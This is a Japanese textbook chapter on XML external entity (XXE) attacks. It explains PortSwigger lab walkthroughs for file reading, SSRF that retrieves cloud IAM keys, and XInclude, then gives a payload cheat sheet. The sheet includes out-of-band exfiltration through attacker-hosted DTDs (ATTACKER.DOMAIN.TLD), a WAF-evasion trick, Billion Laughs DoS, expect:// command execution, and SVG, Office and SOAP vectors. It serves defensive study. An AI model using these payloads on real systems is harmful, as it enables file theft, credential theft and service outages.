# 第2章 古典的XXE — ファイル読取とSSRF


## 古典的XXEの3ラボ（file取得・SSRF・XInclude）

本節では、XML外部実体注入（XXE: XML External Entity injection）の最も基礎的な3パターンを、PortSwiggerの公開ラボ解説に基づいて仕組みレベルで解説する。取り上げるのは、(1) ローカルファイル読取、(2) SSRF（サーバーサイドリクエストフォージェリ、Server-Side Request Forgery。サーバーに攻撃者が意図した宛先へリクエストを送らせる攻撃）への応用、(3) DTD（文書型定義。XML文書の構造や実体を定義する仕組み）を攻撃者が制御できない場面での代替手段であるXIncludeの3つである。いずれも「防御目的での理解」を主眼とし、実在サービスへの無許可検証手順としては使わないこと。

### なぜXXEが成立するのか — パーサの既定動作という根本原因

XXEを理解する上で最初に押さえるべきは、「これは特定のアプリケーションのロジックバグではなく、多くのXMLパーサ実装の既定動作（デフォルト設定）に起因する脆弱性クラスである」という点である。

XML 1.0仕様は、文書の先頭付近に`DOCTYPE`宣言を置くことを許容している。`DOCTYPE`の内部では、独自の「実体（エンティティ、entity）」——つまり文書中の他の場所で展開される変数のようなもの——を定義できる。実体には内部実体（値をその場で定義するもの）と外部実体（値をファイルパスやURLから取得するもの）がある。標準的なXMLライブラリの多くは、アプリケーション側が明示的にこの機能を必要としていない場合でも、外部実体の解決をデフォルトで有効にしたまま出荷される。つまり「オプトイン（明示的な有効化）」ではなく「オプトアウト（明示的な無効化が必要）」な設計になっているパーサが少なくない。

この前提のもとで、攻撃者がアプリケーションに送信するXMLの内容の一部または全部を制御できる場合、以下のような外部実体を注入できる。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

正常時のリクエストは次のようなシンプルなものである。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

これを比較すると、攻撃者が行った変更は次の2点だけだとわかる。

1. `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` という外部実体定義を追加した。`SYSTEM`キーワードは「この実体の値を外部リソース（ファイルやURL）から取得せよ」とパーサに指示するものであり、`file:///etc/passwd`というURIスキームはローカルファイルシステム上のパスを指す。
2. 本来の値だった`381`を、定義した実体への参照である`&xxe;`に置き換えた。

パーサがこのXMLを解析する際、DOCTYPE宣言で外部実体の解決が許可されていると、`&xxe;`という参照に遭遇した時点で`file:///etc/passwd`の中身を読み込み、その内容をあたかも`productId`要素のテキストであったかのように展開する。もしアプリケーションが`productId`の値をレスポンス（在庫確認結果やエラーメッセージなど）にそのまま反映していれば、攻撃者は`/etc/passwd`の中身をレスポンスとして受け取ることができる。これが最も基本的な「in-band（帯域内）」XXEである。

> 出典: XML external entity (XXE) injection — https://portswigger.net/web-security/xxe

この仕組みが成立する条件を整理すると次の3つになる。

- アプリケーションがXML入力を受け付け、パーサに渡している。
- 使用しているXMLパーサが外部実体の解決（および場合によってはXInclude処理）を許可する設定になっている。
- 展開された実体の値が、何らかの形でレスポンスやアプリケーションの挙動に反映される（直接表示されなくても、後述のblind XXEではエラーメッセージやOOB通信で判別可能）。

### ラボ1: 外部実体を利用したファイル取得（Exploiting XXE using external entities to retrieve files）

このラボの想定シナリオは「商品ページの在庫確認（Check stock）機能」である。フロントエンドは商品IDをXML形式でバックエンドに送信し、バックエンドはそのXMLをパースして在庫状況を返す。ユーザーの操作からは見えないが、内部的には以下のようなPOSTリクエストがXMLボディとして送られている。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

攻撃者はこのリクエストをプロキシツール（Burp Suiteなど）で傍受し、ボディを以下のように書き換える。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

このリクエストを送信すると、サーバー側のXMLパーサが`&xxe;`を`/etc/passwd`の内容に展開し、その値をもとに在庫確認処理（存在しない商品IDとしてエラーになるなど）が走る。ここで重要なのは、**エラーメッセージや「該当商品が見つかりません」といった応答の中に、展開された実体の値（＝ファイルの中身）がそのまま含まれてしまう**という点である。攻撃者はこれを読み取ることで、Webサーバーのプロセスが読み取り権限を持つ任意のファイルを窃取できる。

なぜこれが「原理的に」成立するのかをもう一段深く見ると、XML仕様上、実体参照は文書中の任意のテキスト位置に出現でき、パーサはDTD解決フェーズと本体パースフェーズを分けて処理する。DTD解決フェーズで外部実体の値取得（ファイルI/OやHTTPリクエスト）が行われ、その結果が本体パースフェーズでプレーンテキストとして埋め込まれる。アプリケーション側のビジネスロジックは「XMLがパースされ終わった後の値」しか見ないため、その値がどこから来たかを検証する手立てがない。つまり脆弱性の起点はアプリケーションコードではなく、パーサの実体解決という「文書構造レベル」の処理にある。

> 出典: XML external entity (XXE) injection — https://portswigger.net/web-security/xxe

**防御の要点**（詳細は別章で扱うが、本節の結論として明記する）: 根本対策は入力検証ではなく、パーサ設定でDTD処理・外部実体解決・XInclude処理を無効化することである。多くの言語・ライブラリには「安全なデフォルト」を有効化するオプション（例: Javaの`DocumentBuilderFactory`で`FEATURE_SECURE_PROCESSING`を有効にし外部一般/パラメータ実体をdisallowする、libxml2系で`resolve_entities`や`noent`を無効にする、等）が用意されている。

### ラボ2: XXEを悪用したSSRF攻撃（Exploiting XXE to perform SSRF attacks）

ラボ1がローカルファイル読取だったのに対し、このラボは「外部実体の`SYSTEM`識別子にファイルパスではなくURLを指定する」ことで、サーバー自身に任意の宛先へHTTPリクエストを発行させる攻撃、すなわちSSRFへと展開する。

このラボの目的は「XXE脆弱性を悪用してSSRF攻撃を行い、EC2メタデータエンドポイントからサーバーのIAMシークレットアクセスキーを取得すること」である（クラウド環境、特にAWS EC2インスタンス上で動くアプリケーションを想定した演習）。

脆弱な機能はラボ1と同じ「在庫確認」機能で、XML入力を受け取り外部実体宣言を適切に制限していない。攻撃ペイロードは次の通りである。

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/" > ]>
```

このDOCTYPE宣言を`stockCheck`要素の前に挿入し、`productId`の値を`&xxe;`に置き換える点はラボ1と同じ構造だが、`SYSTEM`識別子に与える値が`file://`スキームではなく`http://169.254.169.254/`という**HTTP URL**になっている点が核心である。

`169.254.169.254`は、AWSをはじめとする多くのクラウド環境で使われるリンクローカルアドレス（RFC 3927で定義される、ルーティングされない169.254.0.0/16帯域内のアドレス）であり、EC2などのインスタンスメタデータサービス（IMDS）が待ち受けている。インスタンス内部からのみアクセス可能で、外部ネットワークからは到達できないよう設計されているため、本来はSSRFのような「サーバー自身に代理リクエストを打たせる」手法でしかアクセスできない。XXEはまさにこの「サーバー自身が発信者になる」性質を悪用する典型例である。

なぜ`SYSTEM`識別子がURLを受け付けるのかというと、XML仕様の外部実体は元々「別のファイルやリソースから内容を取り込む」ための汎用的な仕組みであり、`SYSTEM`識別子はURIとして解釈される。パーサの実装は`file://`だけでなく`http://`や`https://`、場合によっては`ftp://`など多様なスキームのURIハンドラを備えていることが多く、これによりファイル読取とネットワークリクエスト発行という一見異なる攻撃が、同じ構文（外部実体宣言）から派生する。

攻略の流れは以下の通りである。

1. 商品ページで「Check stock」を実行し、そのPOSTリクエストをBurp Suiteなどで傍受する。
2. リクエストボディに上記のDOCTYPE宣言を挿入し、`productId`を`&xxe;`に置換する。
3. まずメタデータサービスのルート（`http://169.254.169.254/`）にアクセスし、レスポンス（エラーメッセージ経由で返る場合が多い）からディレクトリ構造を辿る。
4. `/latest/meta-data/iam/security-credentials/`のようなパスへ段階的に掘り下げ、最終的に`/latest/meta-data/iam/security-credentials/admin`（ロール名は環境依存）にアクセスすることで、`SecretAccessKey`を含むJSONレスポンスを取得する。

> 出典: Exploiting XXE to perform SSRF attacks — https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

**補足（一般知識に基づく背景解説）**: IMDSv1（トークン不要でGETリクエストのみでメタデータにアクセスできる旧世代のインスタンスメタデータサービス）はこの種のSSRF/XXE経由の窃取に対して脆弱であったため、AWSはIMDSv2（`PUT`によるセッショントークン取得を必須化し、単純なGETリクエストだけでは取得できないようにする方式）を導入し、現在は新規インスタンスでIMDSv2をデフォルトまたは強制する運用が推奨されている。ただしIMDSv2でも、SSRF脆弱性があればPUT相当のリクエストを偽装できるケースがあるため、根本的にはSSRF/XXE自体を塞ぐことが重要である。この対策の変遷は年代・リージョン・設定によって差があるため、実務では対象環境のIMDS設定（`HttpTokens`が`required`か`optional`か）を必ず確認する必要がある。

### ラボ3: XIncludeを悪用したファイル取得（Exploiting XInclude to retrieve files）

ラボ1・2は「攻撃者がXML文書全体を制御できる」前提だったが、実際の攻撃対象では、ユーザー入力がXML文書の一部（特定の要素の値）としてサーバー側で組み立てられ、DOCTYPE宣言を含む文書全体を攻撃者が書き換えられないケースが多い。このラボはその制約下での代替手段として**XInclude**を扱う。

シナリオは同じく「在庫確認」機能だが、今回は「攻撃者が文書全体を制御できず、したがって独自のDTDを定義できない」という制約が明示される。DOCTYPE宣言自体を注入できなければ、ラボ1・2で使った`<!ENTITY ...>`の定義もできない。しかしXML標準には、DTDとは独立した別の「外部リソース取り込み」機構としてXInclude（W3C勧告、名前空間`http://www.w3.org/2001/XInclude`）が存在する。XIncludeは文書の断片（フラグメント）レベルで動作するため、DOCTYPE宣言を必要とせず、攻撃者が制御できる値の中に直接埋め込むことができる。

攻略ペイロードは以下の通りである。

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

このペイロードを、脆弱なパラメータ（`productId`の値の位置）にそのまま注入する。すなわち、次のようにリクエストボディの該当箇所を置き換える。

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

このペイロードが機能する理由を仕組みから見ていく。

1. **`xmlns:xi="http://www.w3.org/2001/XInclude"`**: これはXML名前空間宣言であり、`xi:`という接頭辞をXIncludeの標準名前空間に紐付けている。パーサがXInclude処理をサポートし有効化されている場合、この名前空間に属する要素（`xi:include`）は特別扱いされ、通常の要素として出力されるのではなく、パーサ自身によって「別リソースの内容に置き換える」処理対象として認識される。
2. **`<xi:include href="file:///etc/passwd"/>`**: `href`属性はDTDにおける`SYSTEM`識別子と同様、取り込み対象のURIを指定する。ここでも`file://`スキームによりローカルファイルパスを指定できる。
3. **`parse="text"`**: XIncludeのデフォルト動作は、取り込んだ内容を**XML文書として再パース**しようとすることである（`parse="xml"`が既定値）。しかし`/etc/passwd`のような任意のテキストファイルは整形式（well-formed）のXMLではないため、XMLとして解析しようとすると構文エラーで失敗してしまう。`parse="text"`を明示的に指定することで、取り込んだ内容を**XML構造として解釈せず、単なる文字列としてそのまま挿入する**よう指示できる。これによりXMLとして不正な任意のファイル内容でも問題なく展開される。

この攻撃が示す本質的なポイントは、「XXE対策＝DTDの無効化」だけでは不十分だということである。多くのパーサでは外部DTDの処理を無効化しても、XIncludeの処理は別のフラグ・別の設定項目で制御されており、見落とされがちである。したがって防御側は、外部実体・外部DTD・XIncludeのすべてを個別に、かつ明示的に無効化する必要がある。

攻略手順は以下の通りである。

1. 商品ページにアクセスし、「Check stock」のPOSTリクエストをBurp Suiteで傍受する。
2. リクエストボディ中の`productId`パラメータの値を、上記のXIncludeペイロードに置き換える。
3. リクエストを送信すると、サーバーはXMLを組み立てる際にXIncludeを処理し、`/etc/passwd`の内容をテキストとして埋め込む。
4. その結果がレスポンス（在庫確認エラーなど）に反映され、攻撃者はファイル内容を読み取れる。

> 出典: Exploiting XInclude to retrieve files — https://portswigger.net/web-security/xxe/lab-xinclude-attack

### 3ラボの比較から見える設計原則

3つのラボを通じて見えてくるのは、「XXEはDOCTYPE宣言だけの問題ではなく、XML仕様が備える複数の“外部リソース取り込み”経路（外部実体・パラメータ実体・XInclude、さらには本章の範囲外だがDTDのSYSTEM識別子経由のSSRFなど）それぞれが独立した攻撃面になり得る」という点である。

| ラボ | 攻撃者が制御できる範囲 | 使用機構 | 取得先の指定方法 | 成立条件 |
|---|---|---|---|---|
| ラボ1（ファイル取得） | XML文書全体 | 外部実体（`<!ENTITY ... SYSTEM>`） | `file://`スキーム | DTD処理・外部実体解決が有効 |
| ラボ2（SSRF） | XML文書全体 | 外部実体（`<!ENTITY ... SYSTEM>`） | `http://`等のURL | DTD処理・外部実体解決が有効、かつ発信元からアクセス可能なネットワーク上に標的が存在 |
| ラボ3（XInclude） | XML文書の一部（要素値のみ） | XInclude（`xi:include`） | `href`属性＋`parse="text"` | XInclude処理が有効（DTD/外部実体が無効でも別経路として機能） |

読者がここで持ち帰るべき結論は次の3点である。

- XXEの根本原因は「XMLパーサが外部リソース取り込み機能をデフォルトで許可している」という設定・実装レベルの問題であり、個々のアプリケーションロジックの誤りではない。
- 攻撃者が文書全体を制御できるか、一部の値しか制御できないかによって、使うべき機構（外部実体 vs XInclude）が変わる。防御側は「DTDだけ無効化すればよい」と考えがちだが、XIncludeという別経路が残っていれば依然として悪用され得る。
- `SYSTEM`識別子や`href`属性は`file://`だけでなく任意のURIスキーム（`http://`など）を受け付け得るため、ファイル読取とSSRFは同じ脆弱性クラスの異なる現れ方に過ぎない。クラウド環境ではSSRF経由のメタデータサービス窃取が特に深刻な実害につながる。

## ペイロード集とチートシート

前節までで、XXE（XML External Entity）が「DTD（Document Type Definition, XML文書の構造を定義する宣言部）内で外部実体（external entity）を宣言し、パーサにそれを解決・展開させることで、意図しないファイル読み取りやSSRF（Server-Side Request Forgery）を引き起こす脆弱性である」という原理を確認した。本節では、実務で使う場面ごとにペイロードを整理したチートシートを提供する。単なる丸暗記ではなく、各ペイロードが「なぜその形で動くのか」をパーサの実体解決アルゴリズムに沿って理解することを目的とする。

### 前提知識の再確認：内部実体と外部実体、一般実体とパラメータ実体

ペイロードを読み解く鍵は、XMLのDTDが持つ4種類の実体（entity, 「値の置き換えに使われる名前付きのプレースホルダ」）の組み合わせを見分けることである。

| 種別 | 宣言例 | 参照方法 | 使える場所 |
|---|---|---|---|
| 内部一般実体 | `<!ENTITY name "value">` | `&name;` | XML文書の本文（要素内容） |
| 外部一般実体 | `<!ENTITY name SYSTEM "URI">` | `&name;` | XML文書の本文（要素内容） |
| 内部パラメータ実体 | `<!ENTITY % name "value">` | `%name;` | DTD内部のみ |
| 外部パラメータ実体 | `<!ENTITY % name SYSTEM "URI">` | `%name;` | DTD内部のみ |

一般実体（`&xxe;`のように`&`で参照するもの）はXML文書の**本文**でのみ展開されるのに対し、パラメータ実体（`%xxe;`のように`%`で参照するもの）は**DTD内部**でのみ展開される。この区別が、後述する「盲目的（blind）XXE」でパラメータ実体を使わざるを得ない理由に直結する。パーサはDTDを上から順に読み込み、実体宣言に出会った時点でその値を確定するのではなく、**参照された時点で遅延評価**する。この遅延評価の性質により、パラメータ実体の中でさらに別のパラメータ実体を組み立てて動的にDTD文字列を生成する、といった多段の細工が可能になる。

### 1. 古典的なファイル読み取り（in-band）

最も基本的な形。アプリケーションのレスポンスに実体の展開結果がそのまま反映される（エコーバックされる）場合に成立する。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

`file://`スキームはローカルファイルシステム上のリソースを指すURIスキームであり、パーサはOSのファイルシステムAPIを呼び出してその内容を読み込む。読み込んだバイト列は、あたかもXML内部実体の値であるかのように、`&test;`が出現した位置にそのままテキストとして挿入（置換）される。レスポンスがXMLをそのままHTMLやJSONに変換して返すAPIであれば、この置換結果を目視できる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XInclude（`http://www.w3.org/2001/XInclude`名前空間を使い、XML文書の一部を外部リソースで置き換える標準機構）が有効な処理系では、そもそも`DOCTYPE`宣言自体を注入できない場面（アプリケーション側で入力欄がXML要素の値だけに限定されている場合など）でも同様の読み取りが可能になる。

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

XIncludeはDTDとは独立した仕組みであり、`DOCTYPE`宣言そのものをフィルタで弾く防御（「入力に`<!DOCTYPE`という文字列が含まれていたら拒否する」という単純な対策）を回避できてしまう点が実務上重要である。XML標準処理系のパーサ設定において「外部実体の解決を止める」設定と「XInclude処理を止める」設定は別のフラグであることが多く、片方だけを無効化しても脆弱性が残る典型例になる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 2. バイナリ・特殊文字を含むファイルの読み取り（PHPラッパー）

`/etc/passwd`のようなプレーンテキストならそのままXMLの本文に埋め込めるが、ソースコードファイル（PHP、XMLなど）には`<`や`&`といったXMLで特別な意味を持つ文字が含まれることが多く、そのまま埋め込むと生成されるXML自体が不正な形式（malformed）になってパースエラーになる。この問題を回避するのが、PHPの`php://filter`ラッパー（ストリームフィルタを介してリソースを読み込む疑似プロトコル）である。

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
  </contact>
</contacts>
```

`convert.base64-encode`フィルタは、指定した`resource`（ここでは`index.php`）の内容をBase64エンコードしてから返す。Base64はアルファベット・数字・`+`・`/`・`=`のみで構成されるため、XMLの構文上安全に本文へ埋め込める。攻撃者は得られたBase64文字列を手元でデコードすれば元のソースコードを復元できる。この手法はPHP環境固有だが、「XML的に危険な文字を含むファイルをどう安全に持ち出すか」という発想はJavaやPythonの環境でも（利用可能なラッパー/プロトコルの違いこそあれ）応用される考え方である。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

パーサがXML自体をパースする前段階で拒否する（`loadXML()`がエラーを返す）場合には、ファイル読み取り自体をパラメータ実体経由でBase64化して差し込む手法も使われる。

```xml
<!DOCTYPE test [
  <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">
  %init;
]><foo/>
```

これは`data://`スキーム（RFC 2397相当のデータURI、値を直接埋め込んで擬似的なリソースとして扱う仕組み）を使い、`%init;`が展開する内容自体をBase64でエンコードして埋め込む応用パターンで、WAFの単純な文字列マッチング（`file:///etc/passwd`のような既知の危険な文字列の検知）を回避する目的でも使われる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 3. SSRFとしてのXXE

`SYSTEM`識別子には`file://`だけでなく`http://`や`https://`も指定できる。パーサは指定されたURIに対してHTTPリクエストを発行し、そのレスポンスボディを実体の値として使う。これにより、外部からは直接到達できない内部ネットワーク（クラウドのメタデータエンドポイント`169.254.169.254`、管理画面、内部APIなど）へのリクエストをサーバ自身に代理させることができる。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
]>
<foo>&xxe;</foo>
```

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XMLパーサが利用するHTTPクライアント実装によっては、`gopher://`や`dict://`のような他プロトコルも解釈できる場合があり、その場合は任意のTCPペイロードを内部ホストへ送りつける、より汎用的なSSRFの足がかりにもなり得る。ただし本教科書は防御目的の解説であるため、内部プロトコル悪用の具体的な攻撃チェーンには立ち入らない。SSRFの詳細な仕組みと防御は本書のSSRF章を参照してほしい。

> 出典: Hackviser「XXE Attack Guide」— https://hackviser.com/tactics/pentesting/web/xxe

### 4. Blind XXE（エコーバックがない場合）とOOBデータ抽出

レスポンスに実体の展開結果が反映されない場合、攻撃者は直接結果を見ることができない。そこで使われるのが、パラメータ実体を使った帯域外（Out-of-Band, OOB）データ抽出である。原理は次の3段階に整理できる。

**ステップ1**: 攻撃対象のXMLに、攻撃者が管理するサーバ上の外部DTDファイルを読み込ませるパラメータ実体を仕込む。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://ATTACKER.DOMAIN.TLD/parameterEntity_oob.dtd">
<data>&send;</data>
```

**ステップ2**: 標的サーバがそのDTDを取得しにいく。攻撃者サーバ上のDTDには、読みたいファイルを指すパラメータ実体`%file`と、それを使ってさらに別の実体`send`を動的に組み立てるパラメータ実体`%all`が入っている。

```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER.DOMAIN.TLD/?%file;'>">
%all;
```

**ステップ3**: `%all;`が展開されると、`<!ENTITY send SYSTEM 'http://ATTACKER.DOMAIN.TLD/?ファイル内容'>`という新しい一般実体宣言がDTD内に動的に生成される。この`send`実体が本文中の`&send;`で参照されると、標的サーバはファイル内容をURLのクエリ文字列として付与した状態で攻撃者サーバへHTTPリクエストを送る。攻撃者はそのアクセスログを見るだけでファイル内容を入手できる。XXEInjectorのようなツールもこの3段階の自動化として設計されている。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

ここで「なぜ`&file;`ではなく`%file;`を使うのか」を仕組みレベルで理解しておく必要がある。前述の通り、一般実体（`&`）はXML**本文**でのみ展開されるのに対し、パラメータ実体（`%`）は**DTD内部**でのみ展開される。ファイル内容をDTDの宣言文の一部として合成したいので、DTD内部で展開できるパラメータ実体でなければならない。多くのXMLパーサはこの仕様に厳密に従っているため、攻撃側もこの制約に沿ってペイロードを組み立てる必要がある。

外部通信（アウトバウンドのHTTP/FTP）自体がファイアウォールで遮断されている環境では、PHPの`php://filter`をOOBの中でも併用し、Base64化したファイル内容を持ち出す変種も使われる。

```xml
<!-- 標的サーバに送るXML -->
<!DOCTYPE r [
  <!ELEMENT r ANY>
  <!ENTITY % sp SYSTEM "http://ATTACKER/dtd.xml">
  %sp;
  %param1;
]>
<r>&exfil;</r>
```

```xml
<!-- 攻撃者サーバ上の dtd.xml -->
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER/dtd.xml?%data;'>">
```

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

XXEInjectorのようなツールでは、`loadXML()`実装がこの標準的なペイロードでパースエラーを起こす場合に備え、`--phpfilter`のようなオプションでBase64化した読み取り経路へ自動的に切り替える機能を持つ。これはPHPの`SimpleXML`/`DOM`実装がある種の非UTF-8バイト列を含む実体展開結果を許容しないケースへの回避策である。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

### 5. エラーベースのXXE（OOB通信も遮断されている場合）

アウトバウンド通信も完全に遮断され、レスポンスにも実体展開結果が出ないが、**パースエラーの詳細メッセージ**だけはレスポンスに含まれる、という環境向けの手法である。存在しないファイルパスへの参照をわざと発生させ、そのエラーメッセージの中にファイル内容を混入させる。

```xml
<!-- 攻撃者サーバ上の ext.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

ここでのポイントは`&#x25;`という数値文字参照（`%`のASCIIコード0x25を指す）である。パラメータ実体の値の中に直接`%`を書くと、その時点で別のパラメータ実体参照だとパーサに解釈されてしまい、意図した「新しい実体宣言を含む文字列」を組み立てられない。数値文字参照でエスケープすることで、`%eval;`が展開された**後**にはじめて`%error`という名前のパラメータ実体宣言が確定する、という二段階の遅延を作り出している。`%error;`が展開されると、`file:///nonexistent/（passwdの内容）`という存在しないパスへのアクセスが発生し、パーサは「そのパスが見つからない」というエラーメッセージを返す際に、パス文字列（＝ファイル内容込み）をそのままエラーテキストに含めてしまう。この結果、レスポンス中のスタックトレースやパースエラーメッセージを見るだけでファイル内容を読み取れる。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

⚠️ **未取得の資料**: SecurityIdiots「XXE Cheat Sheet」は自動取得に失敗しました（理由: DNS解決エラー `getaddrinfo ENOTFOUND www.securityidiots.com` によりサイトへ直接アクセスできず、代替のミラーも存在しなかったため、Web検索による要約のみ確認）。詳細はご自身で直接ご覧ください: http://www.securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html

（以下は未取得資料の補足として一般知識に基づく解説です）同サイトが紹介していたとされる手法の一つに、**ローカルDTD（外部への通信が一切不要な、対象サーバ上に既に存在するDTDファイル）を悪用するエラーベースXXE**がある。前述のエラーベース手法は攻撃者サーバへ一度DTDを取りに行く必要があるが、アウトバウンド通信が完全に遮断された環境では、その取得すら失敗する。この場合、対象OS上に標準で配置されているDTDファイル（Linux環境における`/usr/share/xml/docbook/schema/dtd/*/docbookx.dtd`、Windows環境における.NET関連の`cim20.dtd`などがよく例示される）を`SYSTEM`識別子で参照し、そのDTD内で偶然再利用可能な実体名を上書き（redefine）する手口が知られている。DTDの仕様上、同じ名前のパラメータ実体が複数回宣言された場合は**最初の宣言が有効**というルールがあるため、攻撃者は標的のDTDより先に自分の再定義を読み込ませる順序を作る必要がある。この手法はローカルにインストールされているライブラリ構成に強く依存するため、汎用性は高くないが、外部通信が一切許されない厳格なサンドボックス環境における数少ない突破口として言及されることが多い。

### 6. Billion Laughs攻撃（サービス拒否）

外部実体を使わず、内部実体の入れ子だけでメモリを指数的に消費させ、サービス拒否（Denial of Service, DoS）を引き起こす手法。

```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

`a1`は`a0`を10回参照し、`a2`は`a1`を10回参照する。この入れ子を4段重ねるだけで、最終的に`a4`は`10^4 = 1万個`の"dos"文字列に展開される。段数を増やすほど展開量は10のべき乗で増加するため、わずか数十行のXMLでギガバイト級のメモリ消費を引き起こせる。これは外部リソースへのアクセスを一切必要としないため、「外部実体の解決を無効化する」対策だけでは防げず、**実体展開の深さ・総数に上限を設ける**設定（多くのパーサでデフォルトで有効、または明示的に設定可能）が別途必要になる点が防御設計上の要注意点である。

> 出典: PayloadsAllTheThings「XXE Injection」— https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

### 7. まれなケース：`expect://`によるコード実行

PHPの`expect`拡張モジュール（外部コマンドの標準入出力をストリームとして扱う、デフォルトでは無効な拡張）が有効化されている特殊な環境では、次のようなペイロードでOSコマンド実行に至る可能性がある。

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

これは本来のXXE（データの読み取り・SSRF）とは性質が異なり、「`SYSTEM`識別子に指定できるURIスキームがサーバの環境設定次第でどこまで広がるか」という一般的な原則を示す例として押さえておくとよい。`expect`拡張はデフォルト無効かつ実運用環境で有効化されていることは稀であるため、実際の遭遇頻度は低い。

> 出典: Depth Security「Exploitation: XML External Entity (XXE) Injection」— https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/

### 8. ファイル形式別のXXE注入ポイント

XMLは生のAPIリクエストボディだけでなく、様々なファイル形式のコンテナフォーマットとしても使われている。第3章（ファイルアップロードとXXEの複合パターン）の橋渡しとして、代表的な形式を挙げる。

**SVG画像**: SVGはXMLベースの画像フォーマットであり、画像アップロード機能がSVGを許可している場合、そのままXXEの注入経路になる。

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

アップロードされたSVGがサーバ側でサムネイル生成やラスタライズのためにレンダリングされる際、そのレンダラ内部のXMLパーサが外部実体解決を許していれば、画像として開いただけでXXEが発火する。

**Office系ファイル（XLSX/DOCXなど）**: これらの形式はZIPアーカイブの中に複数のXMLファイルを含むOOXML（Office Open XML）構造を持つ。例えばXLSXであれば`xl/workbook.xml`や`xl/sharedStrings.xml`にDOCTYPE宣言と外部実体を注入し、ZIPとして再圧縮してアップロードすることで、ファイルを開いたアプリケーション側のXMLパーサを標的にできる。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
  <!ELEMENT cdl ANY>
  <!ENTITY % asd SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %asd;%c;
]>
<cdl>&rrr;</cdl>
```

**SOAP（Webサービス）**: CDATAセクション（XMLパーサに文字データとしてそのまま扱わせ、タグとして解釈させないための区画）の中にDOCTYPE宣言を隠す変種もある。

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://ATTACKER:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

これは、SOAPエンドポイントを受け取ったサーバ側の処理系が一度CDATAの中身を取り出して**再度XMLとしてパースし直す**実装になっている場合にのみ有効な、実装依存の手法である。

